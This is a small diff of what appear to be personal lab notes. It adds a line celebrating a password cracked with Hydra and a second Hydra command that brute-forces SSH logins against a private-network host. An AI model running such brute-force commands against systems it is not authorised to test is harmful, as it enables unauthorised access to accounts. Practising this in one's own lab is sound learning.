@@ -50,7 +50,9 @@ ssh sajib@192.168.174.128
 /////now setiing docker 
 
 ///setting hydra brute force 
+ALHAMDULLAH !!!! successfully cracked password using hydra
 hydra -l administrator -P password.txt -T 20 192.168.174.129 ssh
+hydra -l sajib -P password.txt -T 20 192.168.174.128  ssh
 
 
 
